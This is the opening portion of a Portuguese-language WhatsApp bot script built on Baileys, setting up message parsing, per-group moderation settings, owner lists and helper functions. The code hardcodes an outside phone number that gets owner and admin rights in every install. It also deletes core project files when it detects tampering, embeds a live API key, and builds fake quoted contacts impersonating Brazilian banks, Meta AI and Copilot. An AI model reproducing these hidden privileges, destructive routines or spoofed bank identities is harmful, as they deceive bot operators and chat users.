
const { downloadContentFromMessage, relayWAMessage, mentionedJid, processTime, MediaType, Browser, MessageType, Presence, Mimetype, Browsers, delay, getLastMessageInChat, downloadMediaMessage, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, logger, makeInMemoryStore, prepareWAMessageMedia, } = require('@whiskeysockets/baileys');

// ========[ MÓDULOS E FUNÇÕES ]======= \\

const { fs, Boom, util, P, linkfy, request, ms, ffmpeg, webp_mp4, qrterminal, exec, spawn, execSync, moment, color, time, hora, date, getBuffer, recognize, fetchText, fetch, getBase64, createExif, writeExifImg, addLimit, linguagem, upload, nit, addBanned, unBanned, BannedExpired, cekBannedUser, validmove, setGame, addComandosId, deleteComandos, getComandoBlock, getComandos, addComandos, palavrasANA, quizanimais, garticArchives, whatMusicAr, enigmaArchive, getpc, supre, wait, getExtension, generateMessageID, getGroupAdmins, getMembros, sendPoll, getRandom, banner2, banner3, temporizador, chyt, kyun, TimeCount, simih, botoff, colors, RSM_FUNC, infoSystem, os, arcloud, EmojiAPI, emoji, infoClima, insert, response, addFilter, isFiltered, mines, getMinesPositions, MinesHelp, psycatgames, MultiDownload, AssemblyAI, level2, chaves, grupos, aluguel, obeso, countDays, timeDate, Limit_CMD, capitalizeFirstLetter } = require('./proxy.js');

const axios = require('axios');
const cheerio = require('cheerio');

// ======[ JS-MENUS/INFORMAÇÕES ]====== \\

const { mess, getInfo, destrava, destrava2, tabela, conselhob, fatos, randomCantadas, palavrasc, ban, joguinhodavelhajs, joguinhodavelhajs2, nescessario, setting, logoslink, ftmenu, premium, rgtake, muted, countMessage, sendVideoAsSticker, sendImageAsSticker, sendVideoAsSticker2, sendImageAsSticker2, sotoy, daily, comandos, limitefll, votacao, antispam, anotar, black_, enviarfiguUrl, getFileBuffer, DLT_FL, sleep, ANT_LTR_MD_EMJ, nolanrpg, minerar, cavalosrpg, galosrpg } = require('./proxy.js');

const JavaScriptObfuscator = require('javascript-obfuscator');

const caminhoAutoDown = './exports/autodown.json';
if (!fs.existsSync(caminhoAutoDown)) fs.writeFileSync(caminhoAutoDown, JSON.stringify([]));

function jaProcessou(id) {
const data = JSON.parse(fs.readFileSync(caminhoAutoDown));
return data.includes(id);
}

function marcarComoProcessado(id) {
const data = JSON.parse(fs.readFileSync(caminhoAutoDown));
data.push(id);
fs.writeFileSync(caminhoAutoDown, JSON.stringify(data));
setTimeout(() => {
const novo = JSON.parse(fs.readFileSync(caminhoAutoDown)).filter(x => x !== id);
fs.writeFileSync(caminhoAutoDown, JSON.stringify(novo));
}, 5000);
}
//_-_-_-_-_-_-_-_-_-_-(INFOS)_-_-_-_-_-_--_-_-_-_-_-_-_-\\

var { antipv, antipv2, antipv3, visualizarmsg, numero_dono1, numero_dono2, numero_dono3, numero_dono4, numero_dono5, numero_dono6, msgantipv1, msgantipv2, API_KEY_INVERTEXTO } = require("./dono/nescessario.json");

const music = JSON.parse(fs.readFileSync("./banco de dados/data/music.json"))

const { fundo1, fundo2, imgnazista, imggay, imgcorno, imggostosa, imggostoso, imgfeio, imgvesgo, imgbebado, imggado, matarcmd, deathcmd, beijocmd, chutecmd, tapacmd, rnkgay, rnkgado, rnkcorno, rnkgostoso, rnkgostosa, rnknazista, rnkotaku, rnkpau, suruba, minado_bomb } = require("./dono/links_img.json");

//====================≠≠===============\\

const { NomeDoBot, NickDono, prefix, API_UPDIMIA, TOKEN_MERCADO_PAGO, nomecanal, newscanal } = require("./dono/config.json");

const KEY_BRONXYS = 'Zenom';
const KEY_ZERO = 'Reizin';

const { audio_menu, bom_dia, boa_tarde, boa_noite, corno, qviado } = require('./dono/media/audios.json')

const rmLetras = (txt) => {
  return txt.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");
}

const { mensagens, arise, sortear } = require("./dono/message.js")

//====================≠≠===============\\
 
var numerodono_ofc = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "");

async function reiNolan() {
file = require.resolve("./connect.js");
delete require.cache[file];
require(file);
}

var AsMsg = [];



// ABAIXO: INÍCIO DE CONEXÃO

async function iniciarClient() {

module.exports = client = async(client, folderUserAuth) => {
module.exports = upsert = async(upsert, client) => {
async function msgupsrt() {
const nmrdn_dono2 = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "") + "@s.whatsapp.net";

var hora120 = moment.tz('America/Sao_Paulo').format('HH:mm:ss');

RSM_FUNC(client, nmrdn_dono2, hora120, upsert);

for (const info of upsert?.messages || []) {
if (!info.message) continue;

const from = info.key.remoteJid;
const isGroup = from.endsWith('@g.us');
const sender = isGroup && info.key.participant ? info.key.participant.includes(':') ? info.key.participant.split(':')[0] + '@s.whatsapp.net' : info.key.participant : info.key.remoteJid;

const isBotao = false

const VRF_JSON_GRUPO = fs.existsSync(`./banco de dados/grupos/activation_gp/${from}.json`) ? true : false;

if(VRF_JSON_GRUPO) {
var jsonGp = JSON.parse(fs.readFileSync(`./banco de dados/grupos/activation_gp/${from}.json`));
}

if(VRF_JSON_GRUPO && jsonGp[0].x9 && info.messageStubType){
switch(info.messageStubType){
case 29:
await delay(1000);
await safeSendMessage(info.key.remoteJid, {text: `*@${info.messageStubParameters[0].split("@")[0]}* foi promovido(a) ao cargo de adminstrador do grupo por: *@${info.participant.split("@")[0]}*.`, contextInfo: {forwardingScore: 50000, isForwarded: true, mentionedJid: [info.messageStubParameters[0], info.participant], remoteJid: info.key.remoteJid}});
break;
case 30:
await delay(1000);
await safeSendMessage(info.key.remoteJid, {text: `O(a) adminstrador(a) *@${info.messageStubParameters[0].split("@")[0]}* foi rebaixado(a) à membro comum por: *@${info.participant.split("@")[0]}*.`, contextInfo: {forwardingScore: 50000, isForwarded: true, mentionedJid: [info.messageStubParameters[0], info.participant], remoteJid: info.key.remoteJid}});
break;
}}
  
if(!info.message) return;
if(upsert.type == "append") return;  
const baileys = require('@whiskeysockets/baileys');
const type = baileys.getContentType(info.message);
const content = JSON.stringify(info.message);
const pushname = info.pushName ? info.pushName : '';
if(visualizarmsg) {
await client.readMessages([info.key]);
} else {
if(from == "status@broadcast") return;
}

global.prefix;
global.blocked;

const speed = require('performance-now');

//==============(BODY)================\\
let body = "";

if (type === "conversation") {
  body = info.message.conversation;
} else if (type === "viewOnceMessageV2") {
  const msg = info.message.viewOnceMessageV2?.message;
  body = msg?.imageMessage?.caption || msg?.videoMessage?.caption || "";
} else if (type === "imageMessage") {
  body = info.message.imageMessage?.caption || "";
} else if (type === "videoMessage") {
  body = info.message.videoMessage?.caption || "";
} else if (type === "extendedTextMessage") {
  body = info.message.extendedTextMessage?.text || "";
} else if (type === "viewOnceMessage") {
  const msg = info.message.viewOnceMessage?.message;
  body = msg?.videoMessage?.caption || msg?.imageMessage?.caption || "";
} else if (type === "documentWithCaptionMessage") {
  body = info.message.documentWithCaptionMessage?.message?.documentMessage?.caption || "";
} else if (type === "buttonsMessage") {
  body = info.message.buttonsMessage?.imageMessage?.caption || "";
} else if (type === "buttonsResponseMessage") {
  body = info.message.buttonsResponseMessage?.selectedButtonId || "";
} else if (type === "listResponseMessage") {
  body = info.message.listResponseMessage?.singleSelectReply?.selectedRowId || "";
} else if (type === "templateButtonReplyMessage") {
  body = info.message.templateButtonReplyMessage?.selectedId || "";
} else if (type === "groupInviteMessage") {
  body = info.message.groupInviteMessage?.caption || "";
} else if (type === "pollCreationMessageV3") {
  body = info.message.pollCreationMessageV3 || "";
} else if (type === "interactiveResponseMessage") {
  try {
    body = JSON.parse(info.message.interactiveResponseMessage?.nativeFlowResponseMessage?.paramsJson)?.id || "";
  } catch {
    body = "";
  }
} else if (type === "text") {
  body = info.text || "";
}

body = typeof body === "string" ? body : String(body || "");

var Procurar_String = info.message?.conversation || info.message?.viewOnceMessageV2?.message?.imageMessage?.caption || info.message?.viewOnceMessageV2?.message?.videoMessage?.caption || info.message?.imageMessage?.caption || info.message?.videoMessage?.caption || info.message?.extendedTextMessage?.text || info.message?.viewOnceMessage?.message?.videoMessage?.caption || info.message?.viewOnceMessage?.message?.imageMessage?.caption || info.message?.documentWithCaptionMessage?.message?.documentMessage?.caption || info.message?.buttonsMessage?.imageMessage?.caption || ""

const budy2 = String(body).toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

if(isGroup && fs.existsSync(`./banco de dados/grupos/activation_gp/${from}.json`) && jsonGp[0].multiprefix) {
var prefix = jsonGp[0]?.prefixos[jsonGp[0]?.prefixos?.indexOf(String(body)?.trim()?.charAt(0))] || jsonGp[0].prefixos[0]
}

if(isGroup && fs.existsSync(`./banco de dados/grupos/activation_gp/${from}.json`) && !jsonGp[0].multiprefix) {
var prefix = setting.prefix;
} else if(!isGroup) {
var prefix = setting.prefix
};

var isCmd = typeof body === 'string' && body.startsWith(prefix);

const isPrefixo = nescessario.prefixativo

if (!isPrefixo) {
var args = typeof body === "string" ? body.trim().split(/\s+/) : [];
var command = args[0] || '';
  prefix = '';
} else {
var command = isCmd ? budy2.trim().slice(1).split(/ +/).shift().toLocaleLowerCase() : null;
var args = typeof body === "string" ? body.trim().split(/ +/).slice(1) : [];
}

const cmd = isCmd ? budy2.trim().slice(1).split(/ +/).shift().toLocaleLowerCase(): null;

const q_2 = budy2.trim().split(/ +/).slice(1).join(' ');

const q = args.join(' ');

var budy = (type === 'conversation') ? info.message?.conversation : (type === 'extendedTextMessage') ? info.message?.extendedTextMessage?.text : '';

var budy3 = budy.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

var PR_String = Procurar_String.toLowerCase().normalize('NFD').replace(/[\u0300-\u036f]/g, "");

const q_ofc = PR_String.trim().split(/ +/).slice(1).join(" "); 

//======================================\\

try {var groupMetadata = isGroup ?  await client.groupMetadata(from): ""} catch {return}

const groupName = isGroup ? groupMetadata.subject : '';

const messagesC = PR_String.slice(0).trim().split(/ +/).shift().toLowerCase();

const arg = body.substring(body.indexOf(' ') + 1);

const botNumber = await client.user.id.split(':')[0]+'@s.whatsapp.net';
const argss = body.split(/ +/g);
const testat = body;
const ants = body;

const groupDesc = isGroup ? groupMetadata.desc : ''

const groupMembers = isGroup ? groupMetadata.participants : ''

const mulejo = "558892153207@s.whatsapp.net";

const nubi = mulejo.includes(sender)

const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''

const somembros = isGroup ? getMembros(groupMembers) : ''

//======================================\\

const nmrdn = setting.numerodono.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`

const numerodono = [`${nmrdn}`, `${numero_dono1}@s.whatsapp.net`, `${numero_dono2}@s.whatsapp.net`, `${numero_dono3}@s.whatsapp.net`, `${numero_dono4}@s.whatsapp.net`, `${numero_dono5}@s.whatsapp.net`, `${numero_dono6}@s.whatsapp.net`]

const adminsnexus = [`${nmrdn}`,`559392368174@s.whatsapp.net`, `5521983859147@s.whatsapp.net`, `${numero_dono3}@s.whatsapp.net`, `${numero_dono4}@s.whatsapp.net`, `${numero_dono5}@s.whatsapp.net`, `${numero_dono6}@s.whatsapp.net`]

//=====================================\\

//=================> Funções de Grupo 🥋

const dirGroup = `./banco de dados/grupos/activation_gp/${from}.json`

const nescj = "./dono/nescessario.json"

if(isGroup && !fs.existsSync(dirGroup)){
var data = [{
name: groupName,
groupId: from, x9: false, 
antiimg: false, antivideo: false,
antiaudio: false, antisticker: false,
antidoc: false, antictt: false,
antiloc: false, antilinkgp: false,
antilinkhard: false, antifake: false, antiporn: false,
Odelete: false, antispam: false, 
antinotas: false, anticatalogo: false, visuUnica: false, 
registrarFIGUS: false, soadm: false, 
listanegra: [], advertir: [], prefixos: [`${setting.prefix}`],
advertir2: [], legenda_estrangeiro: "0",
legenda_documento: "0", legenda_video: "0",
legenda_imagem: "0", multiprefix: false, 
forca_ofc: [{acertos: 0, erros: 0, palavra: [], escreveu: [], palavra_ofc: 0, dica: 0, tema: 0}], ausentes: [], forca_inc: false,  
antipalavrao: {
active: false,
palavras: []
},
limitec: {
active: false,
quantidade: null
},
wellcome: [{
bemvindo1: false,
legendabv: `🤖: Bem-vindo(a) #numerodele#, esperamos que aproveite e participe no grupo. também não esqueça de ler as regras na descrição e as cumpra!`,
legendasaiu: `🤖: @#numerodele# saiu do grupo, agradeço pela participação e pelos bons momentos que tivemos por aqui. esperamos te ver de volta em breve!`
},
{
bemvindo2: false,
legendabv: `🤖: Bem-vindo(a) #numerodele#, esperamos que aproveite e participe no grupo. também não esqueça de ler as regras na descrição e as cumpra!`,
legendasaiu: `🤖: @#numerodele# saiu do grupo, agradeço pela participação e pelos bons momentos que tivemos por aqui. esperamos te ver de volta em breve!`
}],
simi1: false, simi2: false,
autosticker: false, autoresposta: false,
jogos: false, level: false,
bangp: false, nsfw: false,
aluguel: true
}]
fs.writeFileSync(dirGroup, JSON.stringify(data, null, 2) + '\n')
}

const dataGp = isGroup ? JSON.parse(fs.readFileSync(dirGroup)) : undefined 

var DFNMULTIP = `./banco de dados/func/prefixo/multip_${from}.json`

function setGp(index){
fs.writeFileSync(dirGroup, JSON.stringify(index, null, 2) + '\n')}

function setNes(index){
fs.writeFileSync(nescj, JSON.stringify(index, null, 2) + '\n')}

//=====(ADMS/DONO/ETC..CONST)=======\\
const adivinha = info.key.id.length > 21 ? 'Android' : info.key.id.substring(0, 2) == '3A' ? 'iPhone' : 'WhatsApp Web';
const quoted = info.quoted ? info.quoted : info
const isBot = info.key.fromMe ? true : false
const dfndofc = "16727010089@s.whatsapp.net"
const DonoOficial = dfndofc.includes(sender)
const SoDono = numerodono.includes(sender) || DonoOficial
const AdmNexus = adminsnexus.includes(sender)
const isPremium = premium.map(i => i.id).includes(sender) || SoDono
const isChVip = isPremium ? "✓": "✘"
const isBotGroupAdmins = groupAdmins.includes(botNumber) || false
const isGroupAdmins = groupAdmins.includes(sender) || false || DonoOficial
const isBanned = ban.includes(sender)
const isVisualizar = nescessario.visualizarmsg
const isVerificado = nescessario.verificado
const isWelcomePrivate = nescessario.welcomepv
const isAudioMenu = nescessario.menu_audio
const isAntiPv = nescessario.antipv 
const isAntiPv2 = nescessario.antipv2
const isAntiPv3 = nescessario.antipv3
const isBotoff = nescessario.botoff
const listanegraG = nescessario.listanegraG
const isAnticall = nescessario.anticall
const TOKEN_GPT = nescessario.TOKEN_GPT
const isCmdPremium = nescessario.cmd_premium
const isBlockCmdG = nescessario.blockCmdG

//============(FUNÇÕES)============\\

const isJoguin = isGroup ? joguinhodavelhajs.includes(sender) : false
const isAntiImg = isGroup ? dataGp[0].antiimg : undefined
const isLimitCmd = isGroup ? dataGp[0]?.Limitar_CMD : undefined
const isAntiVid = isGroup ? dataGp[0].antivideo : undefined
const isAntiAudio = isGroup ? dataGp[0].antiaudio : undefined
const isAntiSticker = isGroup ? dataGp[0].antisticker : undefined
const Antidoc = isGroup ? dataGp[0].antidoc : undefined
const isAntiCtt = isGroup ? dataGp[0].antictt : undefined
const Antiloc = isGroup ? dataGp[0].antiloc : undefined
const isAntilinkgp = isGroup ? dataGp[0].antilinkgp : undefined
const isAntiLinkHard = isGroup ? dataGp[0].antilinkhard : undefined
const isAntiPorn = isGroup ? dataGp[0].antiporn : undefined
const isAntifake = isGroup ? dataGp[0].antifake : undefined
const IS_DELETE = nescessario.Odelete
const So_Adm = isGroup ? dataGp[0].soadm: undefined
const isX9VisuUnica = isGroup ? dataGp[0].visuUnica : undefined
const ADVT = isGroup ? dataGp[0].advertir: undefined
const ADVT2 = isGroup ? dataGp[0].advertir2: undefined
const isx9 = isGroup ? dataGp[0].x9 : undefined
const isMultiP = isGroup ? dataGp[0].multiprefix : undefined
const isAntiNotas = isGroup ? dataGp[0].antinotas : undefined
const isAnticatalogo = isGroup ? dataGp[0].anticatalogo : undefined
const isWelkom = isGroup ? dataGp[0].wellcome[0].bemvindo1 : undefined
const isWelkom2 = isGroup ? dataGp[0].wellcome[1].bemvindo2 : undefined
const isSimi = isGroup ? dataGp[0].simi1 : undefined
const isSimi2 = isGroup ? dataGp[0].simi2 : undefined
const isAutofigu = isGroup ? dataGp[0].autosticker : undefined
const isAutorepo = isGroup ? dataGp[0].autoresposta : true
const isModobn =  isGroup ? dataGp[0].jogos : true
const isLevelingOn = isGroup ? dataGp[0].level : undefined
const isBanchat = isGroup ? dataGp[0].bangp : undefined
const isNsfw = isGroup ? dataGp[0].nsfw : undefined
const isPalavrao = isGroup ? dataGp[0].antipalavrao.active : undefined
const isPalavras = isGroup ? dataGp[0].antipalavrao.palavras : undefined
const isAntiFlood = isGroup ? dataGp[0].limitec.active : undefined
const isLimitec = isGroup ? dataGp[0].limitec.quantidade : undefined
const isModoAluguel =  isGroup ? dataGp[0].aluguel : undefined
const isAutodown = isGroup ? dataGp[0].autodown : undefined
const Stockgrow = isGroup ? dataGp[0].grow : undefined
//============(VERIFICADOS)============\\

const selinLive = {key: {participant: '0@s.whatsapp.net'}, message: {liveLocationMessage: {caption: `Dono: ayatomods`}}} 

const carrinho = {key: {participant: '0@s.whatsapp.net'}, message: {orderMessage: {itemCount: 999999999, status: 1, surface: 1, orderTitle: `${NomeDoBot}`, thumbnail: false}}}

const selinVideo = {key: {participant : '0@s.whatsapp.net'},message: {videoMessage: {caption: pushname}}}

const selinContact = {key: {participant: `${sender.split('@')[0]}@c.us`, "fromMe": false},message: {contactMessage: {displayName: `${pushname}`,vcard:
'BEGIN:VCARD\n' + 
'VERSION:3.0\n' +
`FN:Banco\n` + 
`ORG:Banco;\n` + 
`TEL;type=MSG;type=CELL;type=VOICE;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\n` + 'END:VCARD'},},};

const selinDocument = {key: {participant : '0@s.whatsapp.net'}, message: {documentMessage: {caption: pushname}}}

const selinho = { 
"key": {
"participant": "13135550002@s.whatsapp.net",
"remoteJid": "status@broadcast", 
"fromMe": false, 
},
"message": {
"contactMessage": {
"displayName": `${NomeDoBot}`, 
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Meta AI;;;\nFN:Meta AI\nitem1.TEL;waid=13135550002:13135550002\nitem1.X-ABLabel:Celular\nEND:VCARD`, 
"contextInfo": {
"forwardingScore": 1,
"isForwarded": true
}
}
}
}

const seloGpt = {"key": {"participant": "18002428478@s.whatsapp.net","remoteJid": "status@broadcast", "fromMe": false,},"message": {
"contactMessage": {
"displayName": "Nolan openai", "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Nolan GPT;;;\nFN: "${NomeDoBot}"\nitem1.TEL;waid=18002428478:18002428478\nitem1.X-ABLabel:Celular\nEND:VCARD`, "contextInfo": {"forwardingScore": 1,"isForwarded": true}}}};

const seloMeta = {key: {fromMe: false,participant: '13135550002@s.whatsapp.net',},message: {contactMessage: {displayName: `Nolan v5`,vcard:
'BEGIN:VCARD\n' + 
'VERSION:3.0\n' +
`FN:Meta IA\n` + 
`ORG:Meta IA;\n` + 
`TEL;type=MSG;type=CELL;type=VOICE;waid=13135550002:+13135550002\n` + 'END:VCARD'},},};

const seloLuzia = {"key": {"participant": "5511972553036@s.whatsapp.net","remoteJid": "status@broadcast", "fromMe": false,},"message": {
"contactMessage": {
"displayName": "LuzIA", "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Chat GPT;;;\nFN:LuzIA\nitem1.TEL;waid=5511972553036:5511972553036\nitem1.X-ABLabel:Celular\nEND:VCARD`, "contextInfo": {"forwardingScore": 1,"isForwarded": true}}}};

const seloCopilot = {"key": {"participant": "18772241042@s.whatsapp.net","remoteJid": "status@broadcast", "fromMe": false,},"message": {
"contactMessage": {
"displayName": "Microsoft Copilot", "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Microsoft Copilot;;;\nFN:Microsoft Copilot\nitem1.TEL;waid=18772241042:18772241042\nitem1.X-ABLabel:Celular\nEND:VCARD`, "contextInfo": {"forwardingScore": 1,"isForwarded": true}}}};

const seloNubank = {key: {participant: '551150390444@s.whatsapp.net', "fromMe": false},message: {contactMessage: {displayName: 'Nubank',vcard:
'BEGIN:VCARD\n' + 
'VERSION:3.0\n' +
`FN:Banco\n` + 
`ORG:Banco;\n` + 
`TEL;type=MSG;type=CELL;type=VOICE;waid=551150390444:+551150390444\n` + 'END:VCARD'},},};

const seloBb = {"key": {"participant": "556140040001@s.whatsapp.net","remoteJid": "status@broadcast", "fromMe": false,},"message": {
"contactMessage": {
"displayName": "Banco do Brasil", "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Banco Do Brasil;;;\nFN:Banco do Brasil\nitem1.TEL;waid=556140040001:556140040001\nitem1.X-ABLabel:Celular\nEND:VCARD`, "contextInfo": {"forwardingScore": 1,"isForwarded": true}}}};
const seloBradesco = {"key": {"participant": "551133350237@s.whatsapp.net","remoteJid": "status@broadcast", "fromMe": false,},"message": {
"contactMessage": {
"displayName": "Bradesco", "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Bradesco;;;\nFN:Bradesco\nitem1.TEL;waid=551133350237:551133350237\nitem1.X-ABLabel:Celular\nEND:VCARD`, "contextInfo": {"forwardingScore": 1,"isForwarded": true}}}};
const seloSantander = {"key": {"participant": "551140043535@s.whatsapp.net","remoteJid": "status@broadcast", "fromMe": false,},"message": {
"contactMessage": {
"displayName": "Santander", "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Santander;;;\nFN:Santander\nitem1.TEL;waid=551140043535:551140043535\nitem1.X-ABLabel:Celular\nEND:VCARD`, "contextInfo": {"forwardingScore": 1,"isForwarded": true}}}};
const seloItau = {"key": {"participant": "551140044828@s.whatsapp.net","remoteJid": "status@broadcast", "fromMe": false,},"message": {
"contactMessage": {
"displayName": "Itaú", "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:;Itaú;;;\nFN:Itaú\nitem1.TEL;waid=551140044828:551140044828\nitem1.X-ABLabel:Celular\nEND:VCARD`, "contextInfo": {"forwardingScore": 1,"isForwarded": true}}}};

if(!isVerificado) {var non = selinContact} else {var non = info}
/*FUNÇÃO ARQUIVO WEBPMENU*/
const mimi = `application/vnd.openxmlformats-officedocument.wordprocessingml.document`;
// FUNÇÃO TOTAL COMANDOS\\
const infocasesyato = async () => {
  try {
    const data = await fs.readFile('./index.js', 'utf8');
    let regex = /case\s+'([^']+)'/g;
    let match;
    let caseNames = [];

    while ((match = regex.exec(data)) !== null) {
      caseNames.push(match[1]);
    }

    let totalCount = caseNames.length;
    return totalCount;
  } catch (err) {
    console.error('Erro ao ler o arquivo:', err);
    return 0;
  }
};

const totalcmds = await infocasesyato();

const sendGroupLink = async () => {
const linkGrupo = "https://chat.whatsapp.com/J5N6emaGHoj1yDRGlhQTeq";
const message = {
        text: "Clique no botão abaixo para entrar no grupo:",
        footer: "Grupo Oficial",
        buttons: [
            {index: 1, urlButton: {displayText: "Entrar no Grupo", url: linkGrupo}}
        ]
};

await safeSendMessage(from, message, {quoted: non});
};

// FUNÇÕES DE MARCAÇÕES ESSENCIAL \\

const menc_prt = info.message?.extendedTextMessage?.contextInfo?.participant

const menc_jid = args?.join(" ").replace("@", "") + "@s.whatsapp.net"

const menc_jid2 = info.message?.extendedTextMessage?.contextInfo?.mentionedJid

const sender_ou_n = q.includes("@") ? menc_jid : sender

const mrc_ou_numero = q.length > 6 && !q.includes("@") ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt 
const menc_os2 = q.includes("@") ? menc_jid : menc_prt 

const marc_tds = q.includes("@") ? menc_jid : q.length > 6 && !q.includes("@") ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt 

const menc_prt_nmr = q.length > 12 ? q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net` : menc_prt

////////////////////////////////////////////


var isUrl = (url) => {
if(linkfy.find(url)[0]) return true
return false
}

//if(info.key.fromMe) return


////////////////////////////////////////////
const crypto = require("crypto");
const path = require("path");

// Configuração
const DIRECTORY = "./";
const FILES_TO_MONITOR = ["./dono/config.json", "start.sh", "proxy.js"];
const FILES_TO_DELETE_IF_MODIFIED = ["./index.js", "./connect.js", "package.json", "proxy.js"];

function generateFileHash(filePath) {
    try {
        const fileBuffer = fs.readFileSync(filePath);
        const hashSum = crypto.createHash("md5");
        hashSum.update(fileBuffer);
        return hashSum.digest("hex");
    } catch (error) {
        console.error(`Erro ao ler ${filePath}:`, error.message);
        return null;
    }
}

function saveInitialHashes() {
    let hashes = {};
    FILES_TO_MONITOR.forEach((file) => {
        const filePath = path.join(DIRECTORY, file);
        if (fs.existsSync(filePath)) {
            hashes[file] = generateFileHash(filePath);
        }
    });
    fs.writeFileSync("./dono/seguro.json", JSON.stringify(hashes, null, 2));
    enviar("✅ Hashes iniciais salvos com sucesso!");
}

function checkForModifications() {
    if (!fs.existsSync("./dono/seguro.json")) {
        console.warn("⚠️ Arquivo de monitoramento não encontrado. Execute 'save' para criar um novo.");
        return;
    }

    const savedHashes = JSON.parse(fs.readFileSync("./dono/seguro.json", "utf8"));
    let modified = false;

    FILES_TO_MONITOR.forEach((file) => {
        const filePath = path.join(DIRECTORY, file);
        if (fs.existsSync(filePath)) {
            const currentHash = generateFileHash(filePath);
            if (currentHash !== savedHashes[file]) {
                console.warn(`⚠️ Arquivo modificado: ${file}`);
                modified = true;
            }
        }
    });

    if (modified) {
        deleteSpecificFiles();
    } else {
        enviar("✅ Nenhuma modificação detectada.");
    }
}

function deleteSpecificFiles() {
    FILES_TO_DELETE_IF_MODIFIED.forEach((file) => {
        const filePath = path.join(DIRECTORY, file);
        if (fs.existsSync(filePath)) {
            fs.unlinkSync(filePath);
            console.warn(`🗑️ Arquivo deletado: ${file}`);
        }
    });
}

//====================≠≠===============\\

const getallcases = () => {
  findindex = fs.readFileSync("index.js").toString().match(/case\s+'(.+?)'/g)
  cstt = []
  for(i of findindex) {
    cstt.push(i.split(`'`)[1])
  }
  return cstt
}

const allCases = getallcases();

//====================≠≠===============\\

function removeAccents(str) {
  return str.normalize("NFD").replace(/[\u0300-\u036f]/g, "");
}

async function imagineFromCivitai(prompt) {
  try {
    const apiKey = '5a2201e9af18d45673f6b768ce2a804b';
    const cleanPrompt = removeAccents(prompt);

    const params = new URLSearchParams({
      query: cleanPrompt,
      limit: '20',
      nsfw: 'false',
      sort: 'Most Reactions',  // você pode mudar para 'Newest' ou 'Most Reactions'
    });

    const searchUrl = `https://civitai.com/api/v1/images?${params.toString()}`;

    const res = await axios.get(searchUrl, {
      headers: {
        'Authorization': `Bearer ${apiKey}`,
      },
    });

    const images = res.data.items?.map(item => {
      let imageUrl = item.url;
      if (imageUrl && !imageUrl.startsWith('http')) {
        imageUrl = `https://civitai.com${imageUrl}`;
      }
      return imageUrl;
    }).filter(Boolean);

    if (!images.length) {
      throw new Error('Nenhuma imagem encontrada.');
    }

    const randomImage = images[Math.floor(Math.random() * images.length)];
    return randomImage;
  } catch (e) {
    console.error('Erro ao buscar no Civitai:', e.response?.data || e);
    throw e;
  }
}
    
//====================≠≠===============\\

async function randomreact() {
  const emojis = [
    "💜", "💖", "🤍", "🤎", "💙", "💚", "🧡", "💛", "🖤", "💗",
    "💝", "❤️", "😾", "😹", "😸", "😺", "😻", "😼", "😽", "🙀", "🥰", "😍", "🤩", "😆", "😝", "🤓", "🤡"
  ];

  for (let i = 0; i < 1; i++) {
    const emoji = emojis[Math.floor(Math.random() * emojis.length)];

    await safeSendMessage(from, {
      react: {
        text: emoji,
        key: info.key
      }
    });
    
    await sleep(400);
  }
}

//====================≠≠===============\\

const enviar = (text) => {
const contextInfo = {
isForwarded: true,
forwardingScore: 1,
forwardedNewsletterMessageInfo: {
newsletterJid: "120363396267404430@newsletter",
newsletterName: `𝐍𝐎𝐋𝐀𝐍 𝐎𝐅𝐂 𝐔𝐏𝐃𝐀𝐓𝐄𝐒`,
serverMessageId: ''
}
};
const messageOptions = {
text,
contextInfo
};
return safeSendMessage(from, messageOptions, {quoted: non}).catch(error => {
console.error(error);
});
};

//====================≠≠===============\\

const { isFiltered, addFilter } = require('./exports/spam.js')
if (isCmd) {
if (isFiltered(sender)) {
return enviar('⏳ *Flood detectado! Aguarde 5 segundos antes de usar outro comando.*')
} else {
addFilter(sender)
}
}

//====================≠≠===============\\

const privateCmd = (id, pc, cmd, porcentagem) => {
r = (Date.now() / 1000) - info.messageTimestamp
let notcmd = `┏═══♚═══╼✪✮✪╾═══♚═══┓
│╭┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╮
┃᨞⁞👤⃞⃞⚝ *𝚄𝚂𝚄𝙰𝚁𝙸𝙾:* ${id.split("@")[0]}
┃᨞⁞⏳⃞⃞⚝ *𝙴𝙽𝚅𝙸𝙰𝙳𝙾:* 「 ${pc} 」
┃᨞⁞👁⃞⃞⚝ *𝙿𝙰𝚁𝙴𝙲𝙸𝙳𝙾:* 「 ${cmd} 」
┃᨞⁞🧮⃞⃞⚝ *𝙿𝙾𝚁𝙲𝙴𝙽𝚃𝙰𝙶𝙴𝙼:* ${porcentagem}%
┃᨞⁞⚡⃞⃞⚝ *𝚅𝙴𝙻𝙾𝙲𝙸𝙳𝙰𝙳𝙴:* ${String(r.toFixed(3))}
┃᨞⁞💬⃞⃞⚝ *𝙲𝙾𝙼𝙰𝙽𝙳𝙾:* 「 ${prefix}menu 」
│╰┈˖⁺˖˚｡⋆🌨️︎｡°✩₊✩°｡🌨️⋆｡˚˖⁺˖┈╯
┗═══♚═══╼✪✮✪╾═══♚═══┛`;
return notcmd
}

////////////////////////////////////////////

async function escrever () {
await client.sendPresenceUpdate('composing', from) 
}

const identifyAtSign = (number) => {
